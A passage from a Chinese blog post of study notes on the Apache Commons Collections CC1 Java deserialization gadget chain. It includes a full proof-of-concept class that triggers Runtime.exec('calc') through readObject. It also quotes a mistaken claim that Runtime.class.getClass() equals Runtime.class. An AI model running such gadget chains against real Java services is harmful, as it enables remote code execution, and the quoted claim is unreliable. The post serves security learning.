<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">是的，`Runtime<span class="hljs-selector-class">.class</span>` 和 `Runtime<span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.getClass</span>()` 的结果是相同的，它们都表示 `Runtime` 类的 `Class` 对象。<br><br>`Runtime<span class="hljs-selector-class">.class</span>` 是直接获取 `Runtime` 类的 `Class` 对象的表达式，它返回的是一个 `Class&lt;Runtime&gt;` 类型的对象，表示 `Runtime` 类的 `Class` 对象。<br><br>而 `Runtime<span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.getClass</span>()` 是对 `Runtime<span class="hljs-selector-class">.class</span>` 所表示的 `Class` 对象再次调用 `<span class="hljs-built_in">getClass</span>()` 方法，它也返回的是一个 `Class&lt;Runtime&gt;` 类型的对象，表示 `Runtime` 类的 `Class` 对象的 `Class` 对象。<br><br>两者的结果是相同的，都是表示 `Runtime` 类的 `Class` 对象。无论是使用 `Runtime<span class="hljs-selector-class">.class</span>` 还是 `Runtime<span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.getClass</span>()`，都可以获取到相同的结果，用于反射、获取类信息等操作。<br></code></pre></td></tr></tbody></table></figure>
<p>这里写了上述的代码之后，我们发现这样的嵌套执行创建参数太麻烦了，于是乎师傅们找到了可以完美整合我们上述代码的类，这里我们跟进看看</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> {<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    }<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Transforms the input to result via each decorated transformer</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> object  the input object passed to the first transformer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the transformed result</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) {<br>            object = iTransformers[i].transform(object);<br>        }<br>        <span class="hljs-keyword">return</span> object;<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>这里虽然上述提到过，但为了回忆继续分析一遍，逻辑主要就是对传入的Transformer数组元素的遍历，从元素0开始，每调用一次<br>
<code>iTransformers[i].transform(object);</code>得到的object都会被用于下个元素transform(object)的操作，如同流水线一般，上一次的结果当做下一次的开始。这样的话，我们就可以将上述代码这样修改</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = {<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class,Class[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>,<span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class,Object[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}),<br>        };<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>chainedTransformer.transform(Runtime.class);<span class="hljs-comment">//获取Runitme类的原型Class，以便反序列化</span><br></code></pre></td></tr></tbody></table></figure>
<p>这个时候如果我们运行的话，会发现依旧报错，我们下一个断点，看看传参有什么问题。如下图看到传入checkSetValue方法的参数根本不是我们期待的Runtime，根本原因在于上述问题2提到的readObject入口点的setValue参数不可控，那我们再看看有什么类可以解决</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322091313396.png" alt="image-20240322091313396"></p>
<h4 id="ConstantTransformer">ConstantTransformer</h4>
<p>我们继续返回源头看看谁继承了Transformer类接口，如下图的ConstantTransformer类，我们发现他对transform的实现为，不论传入什么参数，都返回一个iConstant常量。那如果我们可以将iConstant常量赋值为Runtime对象，那就顺利解决链子的问题了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322092210733.png" alt="image-20240322092210733"></p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br><br>        Transformer[] transformers = {<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class,Class[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>,<span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class,Object[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}),<br>        };<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">"value"</span>, <span class="hljs-string">"value"</span>);<br>        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(SuppressWarnings.class, decorateMap);<br>        serialize(obj);  <span class="hljs-comment">//序列化</span><br>        unserialize(<span class="hljs-string">"D:\\JavaStudy\\JavaCC1\\src\\main\\java\\Cc1.ser"</span>); <span class="hljs-comment">//反序列化</span><br><br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"D:\\JavaStudy\\JavaCC1\\src\\main\\java\\Cc1.ser"</span>));<br>        oos.writeObject(object);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        objectInputStream.readObject();<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322092449596.png" alt="image-20240322092449596"></p>
<p>可以看到最终成功调用</p>
<h3 id="重新分析链子">重新分析链子</h3>
<p>这里算是初步分析完了，但还是有点懵，接下来再重新梳理一遍思路，就从反序列化入口开始。<br>
我们知道，如果一个类继承了serialize接口的时候，那在反序列化和序列化的时候，都会优先调用该类下重写的readObject与writeObject方法，如果该类下没有重写的话，就会调用java默认的readObject与writeObject方法。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322094724390.png" alt="image-20240322094724390"></p>
<p>如上图，我们能看到，在该链子的入口处，类下含有重写的readObject方法，接下来我们分析其for语句</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//主要就是针对Map.Entry的用法，这里是对memberValues.entrySet进行遍历，并将得到的键值对赋值给memberValue</span><br><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {<br>    <span class="hljs-comment">//name就是键值对中的键</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>    <span class="hljs-comment">//通过get函数获取name键对应的值，赋值给memberType。</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>    <span class="hljs-comment">//判断上述获取的memberType值是否为空</span><br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-comment">//获取键对应的值</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-comment">//如果value值不是memberType的实例，也不是ExceptionProxy的实例，则进入该if语句</span><br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) {<br>                    <span class="hljs-comment">//调用memberValue其中的setValue方法</span><br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">"["</span> + value + <span class="hljs-string">"]"</span>).setMember(<br>                                annotationType.members().get(name)));<br>                }<br>            }<br>        }<br></code></pre></td></tr></tbody></table></figure>
<p>根据我们构造的链子，这里的memberTypes代表的就是注解类型的实例，在这里是我们的：SuppressWarnings，而该类中只含有一个value方法，经过GPT的解释，我也理解了对于Map.Entry遍历的基础知识。</p>
<p>因为我们需要令memberType != null不成立，也就是memberType 不为空，如果我们选择的是常见的注解类型override是不行的，因为其中没有任何属性或者方法。但SuppressWarnings含有value方法，为了memberType不为空，我们需要在遍历之前写下该代码：<code>map.put("value", "value");</code>后一个value值没有要求，但第一个value必须相同，因为当遍历的时候匹配到了该value键，就会去找对应的值（就是函数对应的内容，这里也就是value()）倘若不是value，他就找不到返回null。</p>
<p>这里对于第二个if语句，他会判断value的类型，但类型显然是注解类型的属性，肯定不是上述的两个类的实例，所以一定会进入if语句。这里会调用memberValue的serValue方法，而memberValue已经被我们赋值为decorateMap的Map实例了，我们可以跟进decorateMap去看看具体处理。</p>
<p>decorateMap是来自TransformedMap类，并且还是AbstractInputCheckedMapDecorator类的子类</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Map&lt;<span class="hljs-selector-tag">Object</span>,<span class="hljs-selector-tag">Object</span>&gt; decorateMap = TransformedMap<span class="hljs-selector-class">.decorate</span>(map,null, chainedTransformer);<br></code></pre></td></tr></tbody></table></figure>
<p>decorateMap来源是TransformedMap的构造函数，其中赋值了一个map实例，以及关键的chainedTransformer类，我们一个个分析</p>
<p>要知道这里的decorateMap调用了一个entrySet方法，但其所在TransformedMap类没有这个方法，因此会向父类找该方法，巧的是父类的确有该方法，而该方法返回的是一个包含Map.Entry对象的集合，而每个Map.Entry对象都表示Map中的一个键值对</p>
<p>至于为何我们一定要添加<code>map.put("value", "value");</code>除了注释类型的原因之外，我们可以跟踪一下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322105526897.png" alt="image-20240322105526897"></p>
<p>上述这里又是调用map.entrySet方法，我们如果看一下map的来源就会发现，是来自父类的构造函数的map</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322104849169.png" alt="image-20240322104849169"></p>
<p>可以看到这里的构造函数会判断map是否为空，因此我们必须先对map添加一个键值对。</p>
<p>接着我们返回到刚刚的对decorateMap的键值对的遍历，decorateMap属于TransformedMap类中的属性，但确实Map对象实例，这里说map.entrySet实际上调用的是父类的entrySet方法，而父类又继承了Map对象的接口，因此我们才能对Map对象遍历得到setValue方法，这里我们在遍历到setValue方法之后，如下图，他本应该调用该类下的setValue方法，但是该类的子类却重写了setValue方法，这意味着最终调用的是子类的setValue方法</p>
<p><img src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240322111315300.png" alt="image-20240322111315300"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322111414449.png" alt="image-20240322111414449"></p>
<p>如上图，该子类的又去调用了checkSetValue方法，这里注意是去用parent调用checkSetValue方法，而parent是AbstractInputCheckedMapDecorator对象实例，而由于AbstractInputCheckedMapDecorator虽然实现了checkSetValue方法，但子类重写了该方法，于是就会去子类中调用checkSetValue方法。我们进入到子类对应的方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322112014986.png" alt="image-20240322112014986"></p>
<p>发现是用valueTransformer调用transform方法，而valueTransformer已经被我们赋值为chainedTransformer类对象实例，而该实例的值为如下：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = {<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class,Class[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>,<span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class,Object[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}),<br>        };<br></code></pre></td></tr></tbody></table></figure>
<p>经过chainedTransformer实例中的transform方法，会对上述数组元素分别调用transform方法，目的就是构造出Runtime类实例，并最终调用它的exec方法。那这里还需要注意ConstantTransformer类的作用：因为这里是调用ConstantTransformer类的transform方法，该它的transform方法是不论传入什么参数，始终返回一个常量，而该常量就是构造函数时候传入的参数（在这里就是Runtime.class类对象）</p>
<p>我们可以看看为何要有这个类的存在，如下图，在反序列化入口点，这里的setValue参数明显不可控，我们想要的是传入Runtime类对象，进而可以调用exec，但如果我们使用代码：new ConstantTransformer(Runtime.class)，跟踪这条链子你会发现，最终的调用是这样的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322112709304.png" alt="image-20240322112709304"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322112821410.png" alt="image-20240322112821410"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240322112854858.png" alt="image-20240322112854858"></p>
<p>如上两幅图，最终在先调用ConstantTransformer的transform方法时，也就是返回的第一个Object对象就是常量iConstant，这里已经被赋值为了Runtime.class，完美解决上述入口点参数不可控的问题。</p>
<p>至此回顾完上述链子</p>
<h2 id="总结">总结</h2>
<p>这里总结一下链子</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">ObjectInputStream<span class="hljs-selector-class">.readObject</span>()<br>	AnnotationInvocationHandler<span class="hljs-selector-class">.readObject</span>()<br>		<span class="hljs-built_in">Map</span>()<span class="hljs-selector-class">.setValue</span>()<br>            TransformedMap<span class="hljs-selector-class">.decorateMap</span><br>                ChainedTransformer<span class="hljs-selector-class">.transformer</span>()<br>                    ConstantTransformer<span class="hljs-selector-class">.transformer</span>()<br>                        InvokerTransformer<span class="hljs-selector-class">.transformer</span>()<br>                            Method<span class="hljs-selector-class">.getMethod</span><br>                            getMethod<span class="hljs-selector-class">.getRuntime</span><br>                        InvokerTransformer<span class="hljs-selector-class">.transformer</span>()<br>                            Method<span class="hljs-selector-class">.invoke</span><br>                            Runtime<span class="hljs-selector-class">.getRuntime</span><br>                        InvokerTransformer<span class="hljs-selector-class">.transformer</span>()<br>                            Method<span class="hljs-selector-class">.exec</span><br>                            Runtime<span class="hljs-selector-class">.getRuntime</span><span class="hljs-selector-class">.exec</span><br></code></pre></td></tr></tbody></table></figure>
<p>到这里算是完成Java反序列化的第一个链子了，总的来说，分析过程并不顺利，且基本是靠着文章过来的，没有自己的见解，并且也感受到了自身Java基础有亿点点薄弱（就知道个基础语法），根据师傅的建议，下去看看Java se等相关Java开发的教程，对整个代码布局和写法有个理解，不然分析的时候，完全得靠文章和GPT，进步肯定微弱。</p>
<p>只能说任重道远，接下来依旧是分析一些常见的Java反序列化链子，对Java反序列化有一个较深的理解。</p>
<h1>参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=17c849b13416e3dfa1be2486b797e386">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4%2BxCw1%2BOwxG%3DqNqQ4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-3">JAVA安全初探(三):CC1链全分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.lianqing.xyz/?p=532">Java 反序列化之CC1链</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2024/03/18/java-fan-xu-lie-hua-2/">http://hybcx.xyz/2024/03/18/java-fan-xu-lie-hua-2/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                                    <span class="chip bg-color">Java反序列化</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/03/23/metasploit-xue-xi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Metasploit学习">
                        
                        <span class="card-title">Metasploit学习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-23
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Metasploit/" class="post-category">
                                    Metasploit
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Metasploit/">
                        <span class="chip bg-color">Metasploit</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/03/18/hdctf/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="HDCTF">
                        
                        <span class="card-title">HDCTF</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-18
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
